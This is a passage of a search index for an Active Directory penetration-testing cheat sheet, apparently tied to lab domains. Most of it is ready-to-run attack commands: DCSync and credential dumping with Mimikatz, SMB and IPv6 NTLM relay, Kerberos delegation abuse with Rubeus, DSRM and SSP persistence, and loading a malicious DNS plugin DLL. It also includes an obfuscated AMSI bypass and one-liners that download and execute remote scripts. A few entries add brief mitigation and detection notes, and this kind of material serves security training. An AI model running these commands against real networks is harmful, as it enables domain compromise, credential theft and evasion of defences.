-SamAccountName student572 -ComputerName dcorp-dc -Verbose # Remove permission on remote machine Set-RemotePSRemoting -SamAccountName student572 -ComputerName dcorp-dc -Remove -Verbose Remote Registry # Remote registry changes and backdoors\n# With admin privs on remote machine, create backdoor Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student572 -Verbose # As student572, retrieve machine account hash Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose # Retrieve local account hash Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose # Retrieve domain cached credentials Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose Detection #  Events (Audit Policy for object must be enabled)  4662: An operation was performed on an object 5136: A directory service object was modified 4670: Permissions on an object were changed   Useful tools:  Bloodhound AD ACL Scanner - Create and compare reports of ACLs    "}).add({id:16,href:"/active_directory/lateral_movement/dc_sync/",title:"DC Sync",description:"DC Sync attack.",content:"Locally # # DCSync locally with mimikatz for specific user Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\krbtgt\u0026#34;\u0026#39; Remotely # # Get NTDS.dit via Impacket secretsdump remotely secretsdump.py -dc-ip 10.10.149.145 spookysec.local/backup:backup2517860@10.10.149.145 "}).add({id:17,href:"/active_directory/general/dns/",title:"DNS",description:"Information about DNS in Active Directory.",content:"General #  Active Directory relies on DNS Locate machines and resources on the same domain  Setup DNS # # Install normal DNS server Install-WindowsFeature DNS # Register DNS records cmd /c ipconfig -registerdns "}).add({id:18,href:"/active_directory/mitm_relay/ipv6_attacks/",title:"IPv6 Attacks",description:"IPv6 attacks using mitm6.",content:"Overview #  If both IPv4 and IPv6 are enabled and v4 is the main protocol, DNS for v6 is not configured Attacker can impersonate IPv6 DNS server Capture authentication requests to DC via LDAP or SMB LDAP relay via NTLM  Exploitation # Set Up mitm6 # git clone https://github.com/fox-it/mitm6 /opt/mitm6 cd /opt/mitm6 pip3 install -r requirements.txt python3 setup.py install IPv6 DNS Takeover via mitm6 # # Run mitm6 mitm6 -d domain.local # Set up relay against DC ntlmrelayx.py -6 -t ldaps://192.168.31.10 -wh fakepad.marvel.local -l lootme Mitigation #  Block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy Disable WPAD if it\u0026rsquo;s not used via Group Policy Enable LDAP signing and LDAP channel binding Add Administrative users to the Protected Users group or marking them as sensitive and cannot be delegated to prevent impersonation of that user via delegation  "}).add({id:19,href:"/active_directory/trust_attacks/mssql_servers/",title:"MS-SQL Servers",description:"Attacks against MS-SQL servers.",content:"General #  Generally deployed in a lot of Windows domains Good option for lateral movement as domain users can be mapped to database roles We can use PowerUpSQL for exploitation Cheatsheet  Exploitation # Enumeration # # Discovery (SPN Scanning) Get-SQLInstanceDomain # Check accessibility Get-SQLConnectionTestThreaded Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose # Gather information Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose Database Links #  Database link allows a SQL Server to access exteranl data sources like other SQL server and OLE DB data sources For links between SQL servers, we can exectue stored procedures Links work across forest trusts  Using PowerUpSQL # # Look for links to remote server Get-SQLServerLink -Instance dcorp-mssql -Verbose # Enumerate database links Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose # Execute commands Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query \u0026#34;exec master..xp_cmdshell \u0026#39;whoami\u0026#39;\u0026#34; Using SQL Queries # /* Enumerate database links */ select * from master..sysservers /* Run queries on a linked database through OpenQuery() */ select * from openquery(\u0026#34;dcorp-sql1\u0026#34;, \u0026#34;select * from master..sysservers\u0026#34;) /* Chain queries to access nested links */ select * from openquery(\u0026#34;dcorp-sql\u0026#34;, \u0026#39;select * from openquery(\u0026#34;dcorp-mgmt\u0026#34;, \u0026#34;select * from master..sysservers\u0026#34;)\u0026#39;) /* Enable xp_cmdshell */ EXECUTE(\u0026#39;sp_configure \u0026#34;xp_cmdshell\u0026#34;,1;reconfigure;\u0026#39;) AT \u0026#34;eu-sql\u0026#34; /* Execute commands using nested link queries */ select * from openquery(\u0026#34;dcorp-sql1\u0026#34;, \u0026#39;select * from openquery(\u0026#34;dcorp-mgmt\u0026#34;, \u0026#34;select * from openquery(\u0026#34;eu-sql.eu.eurocorp.local\u0026#34;, \u0026#34;\u0026#34;select @@version as version; exec master..xp_cmdshell \u0026#34;powershell whoami)\u0026#34;\u0026#34;)\u0026#34;)\u0026#39;) "}).add({id:20,href:"/active_directory/mitm_relay/smb_relay/",title:"SMB Relay",description:"SMB Relay attacks using Responder.",content:"What is SMB Relay? #  Capture hashes Relay them to other hosts to authenticate No need to crack hashes with hashcat  Requirements #  SMB signing must be disabled on the target SMB signing checks authenticity of SMB packets Relayed user credentials must be admin on target machine  Exploitation # # Discover hosts with SMB signing disabled python RunFinger.py -i 10.0.0.2/24 nmap --script=smb2-security-mode -p 445 -v 10.10.10.0/24 # Turn off HTTP and SMB in Responder.conf nvim Responder.conf # Start responder python Responder.py -I tun0 -rdwv # Set up relay # Target specific host python MultiRelay.py -t 10.0.2.4 -u ALL # Target multiple hosts # Dump SAM hive python ntlmrelayx.py -tf targets.txt -smb2support # Interactive SMB shell python ntlmrelayx.py -tf targets.txt -smb2support -i nc 127.0.0.1 11000 # Execute command python ntlmrelayx.py -tf targets.txt -smb2support -c \u0026#34;whoami\u0026#34; # Execute binary python ntlmrelayx.py -tf targets.txt -smb2support -e \u0026#34;shell.exe\u0026#34; Mitigation #  Enable SMB signing on all devices (may cause performance issues with file copies) Disable NTLM authentication on the network but Windows can default back to it if Kerberos stops working Account tiering: limit domain admins to specific tasks Local admin restriction (can increase service deskt tickets)  "}).add({id:21,href:"/active_directory/domain_privilege_escalation/unconstrained_delegation/",title:"Unconstrained Delegation",description:"Privilege escalation using unconstrained delegation.",content:"General #  When set for service account, allows delegation to any service to any resource on the domain as a user When enabled, DC places user\u0026rsquo;s TGT inside TGS when user requests access to service with unconstrained delegation enabled Server extracts TGT from TGS and stores it in LSASS Server can reuse the user\u0026rsquo;s TGT to access resoruces Escalate privileges when extracting TGT from Domain Admins or other HVTs Note: need local admin access on the machine to extract tickets  Exploitation # # Get computers that have unconstrained delegation enabled # Using PowerView Get-NetComputer -Unconstrained # Using AD Module Get-ADComputer -Filter { TrustedForDelegation -eq $true } Get-ADUser -Filter { TrustedForDelegation -eq $true } # ldapdomaindump ldapdomaindump -u \u0026#34;DOMAIN\\\\Account\u0026#34; -p \u0026#34;Password123*\u0026#34; 10.10.10.10 grep TRUSTED_FOR_DELEGATION domain_computers.grep # CrackMapExec crackmapexec ldap 10.10.10.10 -u username -p password --trusted-for-delegation # Monitor DA logins on computer Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose # Check if we have local admin access on that machine using PowerView Find-LocalAdminAccess -ComputerName dcorp-appsrv # Get session on machine as local admin and check for tickets Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::tickets\u0026#34;\u0026#39; # Export tickets Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::tickets /export\u0026#34;\u0026#39; # Inject ticket into session Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos:ptt ticket.kirbi\u0026#34;\u0026#39; Printer Bug #  Trick HVT to connect to machine with Unconstrained Delegation enabled Force Domain Admin to connect to specific machine https://github.com/leechristensen/SpoolSample  # Start capturing for TGTs using Rubeus .\\Rubeus.exe monitor /interval:5 /nowrap # Run MS-RPRN.exe .\\MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local \\\\dcorp-appserv.dollarcorp.moneycorp.local # From https://github.com/leechristensen/SpoolSample .\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME .\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB # DC01.HACKER.LAB is the domain controller we want to compromise # HELPDESK.HACKER.LAB is the machine with delegation enabled that we control. # From https://github.com/dirkjanm/krbrelayx printerbug.py \u0026#39;domain/username:password\u0026#39;@\u0026lt;VICTIM-DC-NAME\u0026gt; \u0026lt;UNCONSTRAINED-SERVER-DC-NAME\u0026gt; # From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689 python dementor.py -d domain -u username -p password \u0026lt;UNCONSTRAINED-SERVER-DC-NAME\u0026gt; \u0026lt;VICTIM-DC-NAME\u0026gt; # Copy base64 encoded TGT, remove extra spaces and inject it on attacker machine .\\Rubeus.exe ptt /ticket:ticket.kirbi # Run DCSync Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\krbtgt\u0026#34;\u0026#39; Mitigation #  Limit DA/Admin logins to specific servers Set \u0026ldquo;Account is sensitive and cannot be delegated\u0026rdquo; for privileged accounts  Further Reading #  HackTricks: Unconstrained Delegation PayloadsAllTheThings: Kerberos Unconstrained Delegation iRedTeam: Kerberos Unconstrained Delegation iRedTeam: Domain Compromise via DC Print Server and Kerberos Delegation Security Focus: Analysing Account is Sensitive and cannot be Delegated for Privileged Accounts SpecterOps: Hunting in Active Directory: Unconstrained Delegation \u0026amp; Forest Trusts  "}).add({id:22,href:"/active_directory/domain_enumeration/domain_ou/",title:"Domain OUs",description:"Enumerating domain OUs.",content:"ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get OUs in a domain Get-ADOrganizationalUnit -Filter * -Properties * # Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU Get-GPO -GUID \u0026#34;AB306569-220D-43FF-B03B-83E8F4EF8081\u0026#34; PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get OUs in a domain Get-NetOU -FullData # Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU Get-NetGPO -GPOname \u0026#34;{AB306569-220D-43FF-B03B-83E8F4EF8081}\u0026#34; # Find all computers in a given OU Get-DomainComputer -SearchBase \u0026#34;ldap://OU=...\u0026#34; # Get the logged on users for all machines in any *server* OU in a particular domain Get-DomainOU -Identity *server* -Domain \u0026lt;domain\u0026gt; | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}} "}).add({id:23,href:"/active_directory/domain_privilege_escalation/constrained_delegation/",title:"Constrained Delegation",description:"Privilege escalation using constrained delegation.",content:"General #  When enabled on a service account, allows access only to specified services on specified computers as a user Typical scenario:  User authenticates to a web service without Kerberos Web services makes requests to database server to fetch results based on the user\u0026rsquo;s authorization   To impersonate the user, Service for User (S4U) extension is used which provides two extensions  Service for User to Self (S4U2self) Extension #  Allows service to obtain a forwardable TGS to itself on behalf of a user Only needs the user principal name but NO PASSWORD Service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute set  Service for User to Proxy (S4U2proxy) Extension #  Allows service to obtain a TGS to a second service on behalf of a user Uses the previously obtained TGS from S4U2self Only allows access to services listed in the msDS-AllowedToDelegateTo attribute Attribute contains list of SPNs to which the user tokens can be forwarded  Example Scenario: Constrained Delegation with Protocol Transition #  User (Joe) authenticates to web service running under websvc service account using non-Kerberos method Web service requests ticket from KDC for Joe without supplying a password, as the websvc account KDC checks the websvc userAccountControl value for TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute If set, KDC checks that Joe\u0026rsquo;s account is not blocked for delegation If OK, KDC returns forwardable ticket for Joe\u0026rsquo;s account (S4U2self) Service passes ticket back to the KDC and requests a TGS for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service KDC checks the msDS-AllowedToDelegateTo field on the websvc account If SPN is listed there, KDC return TGS for dcorp-mssql (S4U2proxy) Web service can now authenticate to the CIFS on dcorp-mssql as Joe using the obtained TGS  Exploitation # For Users with Constrained Delegation #  Requires access to the user/service account If we can access it, we can access all the listed services in msDS-AllowedToDelegateTo attribute Can access the services as ANY user  # Enumerate users with constrained delegation enabled # PowerView 3.0 Get-DomainUser -TrustedToAuth # AD Module Get-ADObject -Filter {msDS-AllowedToDelegateTo} -ne \u0026#34;$null\u0026#34;} -Properties msDS-AllowedToDelegateTo # Kekeo # Request TGT for websvc user tgt::ask /domain:dollarcorp.moneycorp.local /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f # Request TGS using s4u in Kekeo and supplying the requested TGT # Impersonate the Administrator Domain Admin # We gain access to the CIFS service tgs::s4u /tgt:tgt.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local # Inject the ticket using mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt tgs.kirbi\u0026#34;\u0026#39; # We can do both steps at the same time using Rubeus # Request TGT and TGS in a single command .\\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:\u0026#34;CIFS/dcorp-mssql.dollarcorp.moneycorp.local\u0026#34; /ptt # We can now access the CIFS service on dcorp-mssql as the dcorp\\Administrator DA user ls \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$ For Computers with Constrained Delegation #  Delegation occurs not only for specific service Occurs for ANY service running under the same service account No validation for SPN specified Requires hash of the machine account of the computer running with constrained delegation  # Enumerate computers with constrained delegation enabled # PowerView 3.0 Get-DomainComputer -TrustedToAuth # AD Module Get-ADObject -Filter {msDS-AllowedToDelegateTo} -ne \u0026#34;$null\u0026#34;} -Properties msDS-AllowedToDelegateTo # Kekeo # Request TGT for machine account tgt::ask /domain:dollarcorp.moneycorp.local /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 # Using s4u, request TGS to access the LDAP service as the DA Adminstrator tgs::s4u /tgt:tgt.kirbi /user:Administrator@dollarcorp.moneycorp.LOCAL /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL # Inject ticket into memory with Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt tgs.kirbi\u0026#34;\u0026#39; # Request TGS and TGT at the same time with Rubeus .\\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:\u0026#34;time/dcorp-dc.dollarcorp.moneycorp.local\u0026#34; /altservice:ldap /ptt # Execute DCSync attack with new permissions Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\krbtgt\u0026#34;\u0026#39; Mitigation #  Disable Kerberos delegation where possible Limit DA/Admin logins to specific services Set \u0026ldquo;Account is sensitive and cannot be delegated\u0026rdquo; for privileged accounts  Further Reading #  iRedTeam: Kerberos Constrained Delegation HackTricks: Constrained Delegation PayloadsAllTheThings: Kerberos Constrained Delegation ShenanigansLabs: Wagging the Dog  "}).add({id:24,href:"/active_directory/domain_persistence/dsrm/",title:"DSRM",description:"Persistence using Directory Services Restore Mode (DSRM).",content:"General #  DSRM is Directory Services Restore Mode There is a local administrator on every DC called \u0026ldquo;Administrator\u0026rdquo; whose password is the DSRM password DSRM password (SafeModePassword) is required when a server is promoted to a DC and it is rarely changed After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC  Exploitation # # Dump DSRM password (needs DA privs) Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34;\u0026#39; -ComputerName dcorp-dc # Compare the Administrator hash with the Administrator hash of below command # The first on is the DSRM local Administrator Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName dcorp-dc # Need to change Logon Behavior for DSRM account before we can pass the hash to login Enter-PSSession -ComputerName dcorp-dc New-ItemProperty \u0026#34;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\u0026#34; -Name \u0026#34;DsrmAdminLogonBehavior\u0026#34; -Value 2 -PropertyType DWORD # Pass the hash to login Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\u0026#34;\u0026#39; # Check if we can access the DC ls \\\\dcorp-dc\\c$ # Get shell .\\PsExec.exe -accepteula \\\\dcorp-dc cmd.exe Detection #  Event IDs:  4657: Audit creation/change of HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ DsrmAdminLogonBehavior 4624: Account Logon 4634: Account Logoff 4672: Admin Logon    "}).add({id:25,href:"/active_directory/general/kerberos/",title:"Kerberos",description:"Information about Kerberos.",content:"Introduction #  Default authentication service for AD domains Uses 3rd party ticket autorization as well as stronger encryption than NTLM   Authentication Process #  Client encrypts a timestamp with his NTLM hash and sends it to the KDC (AS-REQ) KDC encrypts TGT with user NTLM, signs it and sends it back to the user (AS-REP). Only krbtgt can open and read TGT data Clients encrypts TGT with krbtgt NTLM hash when requesting a TGS ticket (TGS-REQ) KDC encrypts TGS with target service\u0026rsquo;s NTLM hash and sends it back to the client (TGS-REP) User connects to the server hosting the service on the appropriate port \u0026amp; presents the TGS (AP-REQ) Service validates the ticket and checks weather the user can access it or not   Terminology # Ticket Granting Ticket (TGT) # Authentication ticket used to request service tickets from the TGS for specific resources from the domain.\nKey Distribution Center (KDC) # A service issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.\nAuthentication Service (AS) # Issues TGTs to be used by the TGS i nthe domain to request access to other machines and service tickets.\nTicket Granting Service (TGS) # Takes the TGT and returns a ticket to a machine on the domain.\nService Principal Name (SPN) # Identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.\nKDC Long Term Secret Key (KDC LT Key) # KDC key is based on the KRBTGT service account. Used to encrypt the TGT and sign the PAC.\nClient Long Term Secret Key (Client LT Key) # Client key is based on the computer or service account. It is used to check the encrypted timestampt and encrypt the session key.\nService Long Term Secret Key (Service LT Key) # The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.\nSession Key # Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.\nPrivilege Attribute Certificate (PAC) # The PAC holds all of the user\u0026rsquo;s relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.\n AS-REQ with Pre-Authentication #  Starts when a user requests a TGT from the KDC To validate the user and create a TGT for him, KDC must follow certain steps  User encrypts a timestamp NT hash and send it to the AS KDC attempts to decrypt the timestampt using the user\u0026rsquo;s NT hash If successful, KDC will issue TGT and session key for the user    Ticket Granting Ticket Contents #  TGT is provided by the user to KDC KDC validates ticket and returns service ticket Content:  Start/end/validity time Service name Target name Client name Session key PCA Signed with  Service LT Key KDC LT Key      Service Ticket Contents #  Contains two portions: service-provided portion \u0026amp; user-provided portion Service portion  User details Session key Encrypts the ticket with service account NTLM hash   User portion  Validity timestamp Session key Encrypts with the TGT session key     Kerberos Tickets Overview #  TGT comes in various formats  .kirbi for Rubeus .ccache for Impacket   Ticket is base64 encoded Once user gives TGT to server, it then  gets user details \u0026amp; session key encrypts ticket with service NTLM hash   KDC will authenticate TGT and return service ticket Normal TGT will only work for the target service KRBTGT allows you to get any service ticket to gain access to anything in the domain   Attack Privilege Requirements #    Attack Requirements     Kerbrute Enumeration No domain access required   Pass the Ticket Access as a user to the domain required   Kerberoasting Access as any user required   AS-REP Roasting Access as any user required   Golden Ticket Full domain compromise (domain admin) required   Silver Ticket Service hash required   Skeleton Key Full domain compromise (domain admin) required    "}).add({id:26,href:"/active_directory/lateral_movement/overpass_the_hash/",title:"Overpass-the-Hash",description:"Overpass-the-Hash attack.",content:"General #  Similar to pass-the-hash Creates valid kerberos ticket from NTLM hash of user Able to access any domain service and not just services that support NTLM authentication like in PTH attacks  Exploitation with Invoke-Mimikatz # Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:\u0026lt;HASH\u0026gt; /run:powershell.exe\u0026#34;\u0026#39; "}).add({id:27,href:"/active_directory/domain_enumeration/domain_gpo/",title:"Domain GPO",description:"Enumerating domain GPOs.",content:"General #  Security settings Registry-based policy settings GPP like start/shutdown/log-on/logff script settings Software installation Abused for privesc, backdoors, persistence  ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get list of GPO in current domain Get-GPO -All # Provides RSoP Get-GPResultantSetOfPolicy -ReportType Html -Path C:\\Users\\Administrator\\report.html PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Display RSoP summary data gpresult /R  # Get list of GPO in current domain Get-NetGPO Get-NetGPO | Select displayname Get-NetGPO -ComputerName ws01.lab.local Get-DomainGPO -ComputerIdentity windows1.testlab.local # Get GPO(s) which use Restricted Groups or groups.xml for interesting users Get-NetGPOGroup # Get users which are in a local group of a machine using GPO Find-GPOComputerAdmin -ComputerName ws01.lab.local # Get machines where the given user is member of a specific group Find-GPOLocation -UserName user -Verbose # Enumerate what machines that a particular user/group identity has local admin rights to # Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation Get-DomainGPOUserLocalGroupMapping -Identity \u0026lt;User/Group\u0026gt; # Enumerate what machines that a given user in the specified domain has RDP access rights to Get-DomainGPOUserLocalGroupMapping -Identity \u0026lt;USER\u0026gt; -Domain \u0026lt;DOMAIN\u0026gt; -LocalGroup RDP # Export a csv of all GPO mappings Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join \u0026#34;, \u0026#34;; $_} | Export-CSV -NoTypeInformation gpo_map.csv "}).add({id:28,href:"/active_directory/domain_persistence/custom_ssps/",title:"Custom SSPs",description:"Persistence using custom Security Support Providers (SSPs).",content:"General #  A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection Some SSP packages by Microsoft are  NTLM Kerberos Wdigest CredSSP   Mimikatz provdes custom SSP - mimilib.dll This SSP logs local logons, service account and machine aacount passwords in clear text on the target server  Exploitation # # First way: drop mimilib.dll to system32 and add mimilib to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages $packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name \u0026#39;Security Packages\u0026#39; | Select -ExpandProperty \u0026#39;Security Packages\u0026#39; $packages += \u0026#34;mimilib\u0026#34; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name \u0026#39;Security Packages\u0026#39; -Value $packages Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name \u0026#39;Security Packages\u0026#39; -Value $packages # Second way: using mimikatz to inject into lsass (unstable with Server 2016) Invoke-Mimikatz -Command \u0026#39;\u0026#34;misc::memssp\u0026#34;\u0026#39; # All logons on the DC are logged to C:\\Windows\\system32\\kiwissp.log Get-Content C:\\Windows\\system32\\kiwissp.log Detection #  Event IDs:  4657: Audit creation/change of HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SecurityPackages 4624: Account Logon 4634: Account Logoff 4672: Admin Logon    "}).add({id:29,href:"/active_directory/domain_privilege_escalation/dns_admins/",title:"DNS Admins",description:"Privilege escalation using DNS Admins.",content:"General #  Members of the DNS Admins group can load arbitrary DLL\u0026rsquo;s with the privileges of dns.exe (SYSTEM) If the DC serves as DNS server, we can escalate to DA But: need to be able to restart the DNS on the DC  Exploitation #  Can use mimilib.dll from mimikatz Modify kdns.c or use boiler plate from here mimilib.dll logs all DNS queries to C:\\Windows\\System32\\kiwidns.log by default Host DLL on SMB server with anonymous access Be careful, else DNS might fail -\u0026gt; noisy!  # Enumerate members of DNSAdmins group # Using PowerView 3.0 Get-DomainGroupMember \u0026#34;DNSAdmins\u0026#34; # Using AD Module Get-ADGroupMember -Identity \u0026#34;DNSAdmins\u0026#34; # With privileges of DNSAdmins member, e.g. through PTH, configure DLL # Using dnscmd.exe (needs RSAT DNS) dnscmd dcorp-dc /config /serverlevelplugindll \\\\172.16.72.100\\dll\\mimilib.dll # Using DNSServer module (needds RSAT DNS) $dnsettings = Get-DNSServerSetting -ComputerName dcorp-dc -Verbose -All $dnsettings.ServerLevelPluginDll = \u0026#34;\\\\172.16.72.100\\dll\\mimilib.dll\u0026#34; Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose # Restart DNS service sc \\\\dcorp-dc stop dns sc \\\\dcorp-dc start dns "}).add({id:30,href:"/active_directory/general/kerberos_delegation/",title:"Kerberos Delegation",description:"Information about Kerberos Delegation.",content:"What is Kerberos Delegation? #  Allows to 